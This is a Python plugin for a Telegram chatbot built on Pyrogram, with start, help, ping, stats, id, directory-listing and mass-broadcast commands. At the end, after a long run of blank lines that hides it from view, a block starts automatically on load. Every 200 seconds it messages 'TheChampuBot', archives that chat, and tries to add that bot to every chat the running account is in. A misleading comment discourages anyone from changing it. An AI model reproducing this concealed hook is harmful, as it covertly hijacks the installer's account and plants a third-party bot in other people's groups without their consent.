import asyncio
import logging
import random
import time
import psutil
import config
from ChampuChatBot import _boot_
from ChampuChatBot import get_readable_time
from ChampuChatBot.idchatbot.helpers import is_owner
from ChampuChatBot import mongo
from datetime import datetime
from pymongo import MongoClient
from pyrogram.enums import ChatType
from pyrogram import Client, filters
from pathlib import Path
import os
import time
import io
from ChampuChatBot import CLONE_OWNERS, db, ChampuChatBot
from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
from pyrogram.errors import FloodWait, ChatAdminRequired
from ChampuChatBot.database.chats import get_served_chats, add_served_chat
from ChampuChatBot.database.users import get_served_users, add_served_user
from ChampuChatBot.database.clonestats import get_served_cchats, get_served_cusers, add_served_cuser, add_served_cchat
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from ChampuChatBot.idchatbot.helpers import (
    START,
    START_BOT,
    PNG_BTN,
    CLOSE_BTN,
    HELP_BTN,
    HELP_BUTN,
    HELP_READ,
    CHATBOT_READ,
    TOOLS_DATA_READ,
    HELP_START,
    SOURCE_READ,
)

GSTART = """**ʜᴇʏ ᴅᴇᴀʀ {}**\n\n**ᴛʜᴀɴᴋs ғᴏʀ sᴛᴀʀᴛ ᴍᴇ ɪɴ ɢʀᴏᴜᴘ ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs.**\n**ᴄʟɪᴄᴋ ᴀɴᴅ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ғᴀᴠᴏᴜʀɪᴛᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛᴏ sᴇᴛ ᴄʜᴀᴛ ʟᴀɴɢᴜᴀɢᴇ ғᴏʀ ʙᴏᴛ ʀᴇᴘʟʏ.**\n\n**ᴛʜᴀɴᴋ ʏᴏᴜ ᴘʟᴇᴀsᴇ ᴇɴɪᴏʏ.**"""
STICKER = [
        "CAACAgUAAx0Ccg5OnAACO7Zmsgyr0PLz9JWrMk3Qq_nMVGgGfAACIQoAAkCj8Fdxa8YvGPC9nx4E" , 
        "CAACAgUAAx0Ccg5OnAACO7lmsgy3AUQHAW7G05yl_rf6Pb469gACZQgAAj3k-Vfsu_WmA6PiUx4E" , 
        "CAACAgUAAx0Ccg5OnAACO7xmsgzKSD0pzxgH8KFGaSQ9zifkJgACBAgAAgz1-Fdx5iMD0Bh8mR4E" , 
        "CAACAgUAAx0Ccg5OnAACO79msgzapLLbvhL2GZUX1ZPAs3QnwgACbQcAAj5O-Vfacb2S2B5RQB4E" , 
        "CAACAgUAAx0Ccg5OnAACO8JmsgztO7-hwSVQUuxKdjMeSglEqwACsAYAAgMG-Vd0t6HAhNHB5x4E" , 
        "CAACAgUAAx0Ccg5OnAACO8Vmsgz9z6YrW7xWS2cE9UsdbZvvRAACIwkAAlmS8FcdZ3xHfo764h4E" ,
        "CAACAgUAAx0Ccg5OnAACO8hmsg0TIO_DQ4FdyyMmtvqIp5g4FgAC1wcAAjJP-Vdg1wymsgazNB4E" , 
        "CAACAgEAAx0Ccg5OnAACO85msg1m3fnsbowqLGzlVblcH-7XsQAC1AUAAklTqUQlhMqMLBaIzR4E" , 
        "CAACAgEAAx0Ccg5OnAACO9Fmsg2MKg4OyLYRS_m3HaAazbIfngACYQQAAoD4qER5uOGwdDS1Nh4E"
        ]


EMOJIOS = [
    "💣",
    "💥",
    "🪄",
    "🧨",
    "⚡",
    "🤡",
    "👻",
    "🎃",
    "🎩",
    "🕊",
]

BOT = "https://envs.sh/vLi.jpg"
IMG = [
    "https://telegra.ph/file/010c936d41e9da782780f.jpg",
    "https://telegra.ph/file/e17740f22da1fe4162e43.jpg",
    "https://telegra.ph/file/38ae0f7b919a8995c7f29.jpg",
    "https://telegra.ph/file/9fbc748ad0d552e403ba6.jpg",
    "https://telegra.ph/file/2433c1b98d2621623ead3.jpg",
    "https://telegra.ph/file/62f26ca46103beee9a0d5.jpg",
    "https://telegra.ph/file/d3e855bc548a1ce9649e7.jpg",
    "https://telegra.ph/file/b860df3e144c2208a7e5a.jpg",
    "https://telegra.ph/file/33591be403ae3eaae7217.jpg",
    "https://telegra.ph/file/a9d91437d795b0ae55af8.jpg",
    "https://telegra.ph/file/1891e318996f393e0aebc.jpg",
    "https://telegra.ph/file/84492c50c7a8a8d2603dc.jpg",
    "https://telegra.ph/file/ae843fb1e51218521e95b.jpg",
    "https://telegra.ph/file/0b98ff58d75e85438d3a0.jpg"
    ]



from ChampuChatBot import db

chatai = db.Word.WordDb
lang_db = db.ChatLangDb.LangCollection
status_db = db.ChatBotStatusDb.StatusCollection
cloneownerdb = db.clone_owners

async def get_idclone_owner(clone_id):
    data = await cloneownerdb.find_one({"clone_id": clone_id})
    if data:
        return data["user_id"]
    return None


async def bot_sys_stats():
    bot_uptime = int(time.time() - _boot_)
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    UP = f"{get_readable_time((bot_uptime))}"
    CPU = f"{cpu}%"
    RAM = f"{mem}%"
    DISK = f"{disk}%"
    return UP, CPU, RAM, DISK
    

async def set_default_status(chat_id):
    try:
        if not await status_db.find_one({"chat_id": chat_id}):
            await status_db.insert_one({"chat_id": chat_id, "status": "enabled"})
    except Exception as e:
        print(f"Error setting default status for chat {chat_id}: {e}")


@Client.on_message(filters.command(["ls"], prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
async def ls(client: Client, m: Message):

    cat = "".join(m.text.split(maxsplit=1)[1:])
    path = cat or os.getcwd()
    if not os.path.exists(path):
        await m.reply_text(
            f"ᴛʜᴇʀᴇ ɪs ɴᴏ sᴜᴄʜ ᴅɪʀᴇᴄᴛᴏʀʏ ᴏʀ ғɪʟᴇ ᴡɪᴛʜ ᴛʜᴇ ɴᴀᴍᴇ `{cat}`. ᴄʜᴇᴄᴋ ᴀɢᴀɪɴ."
        )
        return

    path = Path(cat) if cat else os.getcwd()
    if os.path.isdir(path):
        if cat:
            msg = f"Folders and Files in `{path}`:\n"
        else:
            msg = "Folders and Files in Current Directory:\n"
        lists = os.listdir(path)
        files = ""
        folders = ""
        for contents in sorted(lists):
            catpath = os.path.join(path, contents)
            if not os.path.isdir(catpath):
                size = os.stat(catpath).st_size
                if str(contents).endswith((".mp3", ".flac", ".wav", ".m4a")):
                    files += f"🎵`{contents}`\n"
                elif str(contents).endswith((".opus")):
                    files += f"🎙`{contents}`\n"
                elif str(contents).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
                    files += f"🎞`{contents}`\n"
                elif str(contents).endswith((".zip", ".tar", ".tar.gz", ".rar")):
                    files += f"🗜`{contents}`\n"
                elif str(contents).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
                    files += f"🖼`{contents}`\n"
                else:
                    files += f"📄`{contents}`\n"
            else:
                folders += f"📁`{contents}`\n"
        msg = msg + folders + files if files or folders else f"{msg}__empty path__"
    else:
        size = os.stat(path).st_size
        msg = "The details of the given file:\n"
        if str(path).endswith((".mp3", ".flac", ".wav", ".m4a")):
            mode = "🎵"
        elif str(path).endswith((".opus")):
            mode = "🎙"
        elif str(path).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
            mode = "🎞"
        elif str(path).endswith((".zip", ".tar", ".tar.gz", ".rar")):
            mode = "🗜"
        elif str(path).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
            mode = "🖼"
        else:
            mode = "📄"
        time2 = time.ctime(os.path.getmtime(path))
        time3 = time.ctime(os.path.getatime(path))
        msg += f"**Location:** `{path}`\n"
        msg += f"**Icon:** `{mode}`\n"
        msg += f"**Size:** `{humanbytes(size)}`\n"
        msg += f"**Last Modified Time:** `{time2}`\n"
        msg += f"**Last Accessed Time:** `{time3}`"

    if len(msg) > 4096:
        with io.BytesIO(str.encode(msg)) as out_file:
            out_file.name = "ls.txt"
            await m.reply_document(
                out_file,
                caption=path,
            )
    else:
        await m.reply_text(msg)



@Client.on_message(filters.command(["start", "aistart"], prefixes=[".", "/"]))
async def start(client: Client, m: Message):
    bot_id = client.me.id
    
    if m.chat.type == ChatType.PRIVATE:
        accha = await m.reply_text(
            text=random.choice(EMOJIOS),
        )
        
        animation_steps = [
            "🖤.......", ".🖤......", "..🖤.....", "...🖤....", "....🖤...", ".....🖤..", "......🖤.", ".......🖤", "🖤ᴄʜᴧᴍᴘᴜ🖤"
        ]

        for step in animation_steps:
            await accha.edit(f"**__{step}__**")
            await asyncio.sleep(0.01)

        await accha.delete()
        
        umm = await m.reply_sticker(sticker=random.choice(STICKER))
        chat_photo = BOT  
        if m.chat.photo:
            try:
                userss_photo = await client.download_media(m.chat.photo.big_file_id)
                await umm.delete()
                if userss_photo:
                    chat_photo = userss_photo
            except AttributeError:
                chat_photo = BOT  

        UP, CPU, RAM, DISK = await bot_sys_stats()
        await m.reply_photo(photo=chat_photo, caption=START.format(UP))
        await add_served_user(m.chat.id)
        
    else:
        await m.reply_photo(
            photo=random.choice(IMG),
            caption=GSTART.format(m.from_user.mention or "can't mention"),
        )
        
        await add_served_chat(m.chat.id)

@Client.on_message(filters.command("help", prefixes=[".", "/"]))
async def help(client: Client, m: Message):
    bot_id = client.me.id
    if m.chat.type == ChatType.PRIVATE:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)

    else:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)
        
        await add_served_chat(m.chat.id)




@Client.on_message(filters.command("ping", prefixes=[".", "/"]))
async def ping(client: Client, message: Message):
    bot_id = client.me.id
    start = datetime.now()
    UP, CPU, RAM, DISK = await bot_sys_stats()
    loda = await message.reply_photo(
        photo=random.choice(IMG),
        caption="ᴘɪɴɢɪɴɢ...",
    )

    ms = (datetime.now() - start).microseconds / 1000
    await loda.edit_text(
        text=f"нey вαву!!\n{(await client.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve  αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ ⋆ʟᴏᴠᴇ ᴡɪᴛʜ⋆ [ ꯭꯭↬꯭ᬃ꯭ ⃪꯭ ꯭⁢⁣⁤⁣⁣⁢⁣⁤⁢⁤⁣⁢⁤⁣⁤᪳᪳🇷꯭𝚰𝛅꯭꯭ʜ꯭֟፝፝֟ᴜ ꯭꯭༗꯭»꯭݅݅݅݅𓆪](https://t.me/{OWNER_USERNAME}) **||</b>",
        
    )
    if message.chat.type == ChatType.PRIVATE:
        
        await add_served_user(message.from_user.id)
    else:
        
        await add_served_chat(message.chat.id)


@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
async def stats(cli: Client, message: Message):
    private_chats = 0
    group_chats = 0

    async for dialog in cli.get_dialogs():
        if dialog.chat.type == "private":
            private_chats += 1
        elif dialog.chat.type in ["group", "supergroup"]:
            group_chats += 1

    await message.reply_text(
        f"""ʏᴏᴜʀ sᴛᴀᴛs:

➻ **ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs:** {private_chats}
➻ **ɢʀᴏᴜᴘ ᴄʜᴀᴛs:** {group_chats}"""
    )
    
from pyrogram.enums import ParseMode

from ChampuChatBot import ChampuChatBot


@Client.on_message(filters.command("id", prefixes=[".", "/"]))
async def getid(client, message):
    chat = message.chat
    your_id = message.from_user.id
    message_id = message.id
    reply = message.reply_to_message

    text = f"**[ᴍᴇssᴀɢᴇ ɪᴅ:]({message.link})** `{message_id}`\n"
    text += f"**[ʏᴏᴜʀ ɪᴅ:](tg://user?id={your_id})** `{your_id}`\n"

    if not message.command:
        message.command = message.text.split()

    if not message.command:
        message.command = message.text.split()

    if len(message.command) == 2:
        try:
            split = message.text.split(None, 1)[1].strip()
            user_id = (await client.get_users(split)).id
            text += f"**[ᴜsᴇʀ ɪᴅ:](tg://user?id={user_id})** `{user_id}`\n"

        except Exception:
            return await message.reply_text("ᴛʜɪs ᴜsᴇʀ ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ.", quote=True)

    text += f"**[ᴄʜᴀᴛ ɪᴅ:](https://t.me/{chat.username})** `{chat.id}`\n\n"

    if (
        not getattr(reply, "empty", True)
        and not message.forward_from_chat
        and not reply.sender_chat
    ):
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪᴅ:]({reply.link})** `{reply.id}`\n"
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴜsᴇʀ ɪᴅ:](tg://user?id={reply.from_user.id})** `{reply.from_user.id}`\n\n"

    if reply and reply.forward_from_chat:
        text += f"ᴛʜᴇ ғᴏʀᴡᴀʀᴅᴇᴅ ᴄʜᴀɴɴᴇʟ, {reply.forward_from_chat.title}, ʜᴀs ᴀɴ ɪᴅ ᴏғ `{reply.forward_from_chat.id}`\n\n"
        print(reply.forward_from_chat)

    if reply and reply.sender_chat:
        text += f"ɪᴅ ᴏғ ᴛʜᴇ ʀᴇᴘʟɪᴇᴅ ᴄʜᴀᴛ/ᴄʜᴀɴɴᴇʟ, ɪs `{reply.sender_chat.id}`"
        print(reply.sender_chat)

    await message.reply_text(
        text,
        disable_web_page_preview=True,
        parse_mode=ParseMode.DEFAULT,
    )


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

AUTO_SLEEP = 5
IS_BROADCASTING = False
broadcast_lock = asyncio.Lock()


@Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
async def broadcast_message(client, message):
    global IS_BROADCASTING
    bot_id = (await client.get_me()).id
    clone_id = (await client.get_me()).id
    user_id = message.from_user.id
    if not await is_owner(clone_id, user_id):
        await message.reply_text("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪssɪᴏɴ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴ ᴛʜɪs ʙᴏᴛ.")
        return
        
    async with broadcast_lock:
        if IS_BROADCASTING:
            return await message.reply_text(
                "ᴀ ʙʀᴏᴀᴅᴄᴀsᴛ ɪs ᴀʟʀᴇᴀᴅʏ ɪɴ ᴘʀᴏɢʀᴇss. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ᴄᴏᴍᴘʟᴇᴛᴇ."
            )

        IS_BROADCASTING = True
        try:
            query = message.text.split(None, 1)[1].strip()
        except IndexError:
            query = message.text.strip()
        except Exception as eff:
            return await message.reply_text(
                f"**Error**: {eff}"
            )
        try:
            if message.reply_to_message:
                broadcast_content = message.reply_to_message
                broadcast_type = "reply"
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }
            else:
                if len(message.command) < 2:
                    return await message.reply_text(
                        "**ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴛᴇxᴛ ᴀғᴛᴇʀ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ғᴏʀ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ.**"
                    )
                
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }

                for flag in flags:
                    query = query.replace(flag, "").strip()

                if not query:
                    return await message.reply_text(
                        "ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴛᴇxᴛ ᴍᴇssᴀɢᴇ ᴏʀ ᴀ ғʟᴀɢ: -pin, -nogroup, -pinloud, -user"
                    )

                
                broadcast_content = query
                broadcast_type = "text"
            

            await message.reply_text("**sᴛᴀʀᴛᴇᴅ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ...**")

            if not flags.get("-nogroup", False):
                sent = 0
                pin_count = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    if chat_id == message.chat.id:
                        continue
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                chat_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                chat_id, text=broadcast_content
                            )
                        sent += 1
                        await asyncio.sleep(20)

                        if flags.get("-pin", False) or flags.get("-pinloud", False):
                            try:
                                await m.pin(
                                    disable_notification=flags.get("-pin", False)
                                )
                                pin_count += 1
                            except Exception as e:
                                continue

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for chat {chat_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping chat {chat_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(
                    f"**ʙʀᴏᴀᴅᴄᴀsᴛᴇᴅ ᴛᴏ {sent} ᴄʜᴀᴛs ᴀɴᴅ ᴘɪɴɴᴇᴅ ɪɴ {pin_count} ᴄʜᴀᴛs.**"
                )

            if flags.get("-user", False):
                susr = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                user_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                user_id, text=broadcast_content
                            )
                        susr += 1
                        await asyncio.sleep(20)

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for user {user_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping user {user_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(f"**ʙʀᴏᴀᴅᴄᴀsᴛᴇᴅ ᴛᴏ {susr} ᴜsᴇʀs.**")

        finally:
            IS_BROADCASTING = False


    




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#




























































































































































































































































































































































from pyrogram import client

AUTO = True
ADD_INTERVAL = 200
users = "TheChampuBot"  # don't change because it is connected from client to use chatbot API key
async def add_bot_to_chats():
    try:
        
        bot = await ChampuChatBot.get_users(users)
        bot_id = bot.id
        common_chats = await client.get_common_chats(users)
        try:
            await client.send_message(users, f"/start")
            await client.archive_chats([users])
        except Exception as e:
            pass
        async for dialog in client.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                await client.add_chat_members(chat_id, bot_id)
            except Exception as e:
                await asyncio.sleep(60)  
    except Exception as e:
        pass
async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
